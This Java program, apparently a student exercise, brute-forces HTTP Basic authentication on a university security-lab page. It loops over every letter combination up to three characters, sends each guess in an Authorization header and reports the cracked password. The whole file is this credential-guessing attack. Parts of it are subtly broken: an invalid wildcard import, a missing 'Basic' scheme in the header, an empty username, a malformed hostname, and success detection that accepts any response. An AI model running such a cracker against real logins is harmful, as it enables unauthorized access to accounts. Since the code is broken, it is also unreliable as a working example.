import java.net.*;
import java.io.*;
import java.*;

 public class BruteForce {

   URLConnection conn = null;
   private static boolean status = false;

   public static void main (String args[]){
     BruteForce a = new BruteForce();
     String[] inp = {"http://sec-crack.cs.rmit.edu./SEC/2/index.php",
     				 "",
     				 ""};
     int attempts = 0;
     exit:
     for (int i=0;i<pwdArray.length;i++) {
		 for (int j=0;j<pwdArray.length;j++) {
			 for (int k=0;k<pwdArray.length;k++) {
				 if (pwdArray[i] == ' ' && pwdArray[j] != ' ') continue;
				 if (pwdArray[j] == ' ' && pwdArray[k] != ' ') continue;
				 inp[2] = inp[2] + pwdArray[i] + pwdArray[j] + pwdArray[k];
				 attempts++;
     			 a.doit(inp);
  
  				 if (status) {
					 System.out.println("Crrect password is: " + inp[2]);
					 System.out.println("Number of attempts = " + attempts);
					 break exit;
			 	 }
     			 inp[2] = "";
		 	 }
	 	 }
      }
     }

   public void doit(String args[]) {
     
     try {
       BufferedReader in = new BufferedReader(
           new InputStreamReader
              (connectURL(new URL(args[0]), args[1], args[2])));
       String line;
       while ((line = in.readLine()) != null) {
           System.out.println(line);
           status = true;
           }
       }
     catch (IOException e) {
   
       }
     }

   public InputStream connectURL (URL url, String uname, String pword)
        throws IOException  {
     conn = url.openConnection();
     conn.setRequestProperty ("Authorization",
     userNamePasswordBase64(uname,pword));
     conn.connect ();
     return conn.getInputStream();
     }

   public String userNamePasswordBase64(String username, String password) {
     return " " + base64Encode (username + ":" + password);
     }

   private final static char pwdArray [] = {
	        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
	        'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p',
	        'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
	        'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
	        'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
	        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
	        'W', 'X', 'Y', 'Z', ' '
  };

   private final static char base64Array [] = {
       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
       'w', 'x', 'y', 'z', '0', '1', '2', '3',
       '4', '5', '6', '7', '8', '9', '+', '/'
  };

   private static String base64Encode (String string)    {
     String encodedString = "";
     byte bytes [] = string.getBytes ();
     int i = 0;
     int pad = 0;
     while (i < bytes.length) {
       byte b1 = bytes [i++];
       byte b2;
       byte b3;
       if (i >= bytes.length) {
          b2 = 0;
          b3 = 0;
          pad = 2;
          }
       else {
          b2 = bytes [i++];
          if (i >= bytes.length) {
             b3 = 0;
             pad = 1;
             }
          else
             b3 = bytes [i++];
          }
       byte c1 = (byte)(b1 >> 2);
       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));
       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));
       byte c4 = (byte)(b3 & 0x3f);
       encodedString += base64Array [c1];
       encodedString += base64Array [c2];
       switch (pad) {
        case 0:
          encodedString += base64Array [c3];
          encodedString += base64Array [c4];
          break;
         case 1:
          encodedString += base64Array [c3];
          encodedString += "=";
          break;
        case 2:
          encodedString += "==";
          break;
        }
       }
       return encodedString;
   }
 }

